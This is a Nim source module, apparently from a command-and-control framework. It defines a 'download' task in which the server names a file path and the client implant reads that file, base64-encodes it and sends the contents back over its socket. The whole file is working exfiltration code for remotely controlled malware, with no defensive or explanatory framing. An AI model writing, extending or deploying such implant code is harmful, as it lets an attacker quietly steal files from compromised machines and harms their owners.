when defined(server):
  import asyncdispatch, json
  import ../server/[types, communication]

when defined(client):
  import net, base64
  import ../client/communication

when defined(server):
  proc sendTask*(client: C2Client, path: string): Future[Task] {.async.} =
    return await client.sendClientTask("download", %*{ "path": path })

when defined(client):
  proc executeTask*(client: Socket, taskId: int, path: string) =
    try:
      let contents: string = readFile(path)
      client.sendFile(taskId, path, encode(contents))
    except IOError:
      client.sendFile(taskId, path, "", "File " & path & " does not exist!")